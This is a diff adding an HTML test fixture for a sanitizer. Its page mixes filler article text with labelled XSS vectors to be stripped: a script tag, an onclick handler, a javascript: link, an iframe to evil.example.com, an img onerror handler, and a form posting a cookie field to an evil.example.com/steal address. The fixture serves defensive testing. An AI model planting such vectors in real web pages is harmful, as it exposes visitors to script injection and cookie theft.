@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Article With Hostile Payloads</title>
+</head>
+<body>
+<article>
+  <h1>Article With Hostile Payloads</h1>
+  <p>This paragraph is benign content that should be preserved during extraction.</p>
+  <script>alert("script tag should never survive sanitization")</script>
+  <p>Below is content with various XSS vectors that the sanitizer must strip:</p>
+  <p onclick="alert('inline handler')">Inline event handlers must not survive.</p>
+  <p>Inline javascript: links must not survive: <a href="javascript:alert(1)">click me</a></p>
+  <p>An iframe should not survive:</p>
+  <iframe src="https://evil.example.com/"></iframe>
+  <p>An image with onerror must lose the handler:</p>
+  <img src="https://example.com/missing.png" onerror="alert('image handler')" alt="x">
+  <p>A form with a method should be stripped:</p>
+  <form method="post" action="https://evil.example.com/steal"><input name="cookie"></form>
+  <p>Real article text continues here so the extractor has at least several hundred characters to work with. Lorem ipsum dolor sit amet, consectetur adipiscing elit. The article body must be preserved while the malicious sub-elements are removed by sanitization. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Vestibulum tortor quam, feugiat vitae, ultricies eget, tempor sit amet, ante. Donec eu libero sit amet quam egestas semper.</p>
+</article>
+</body>
+</html>
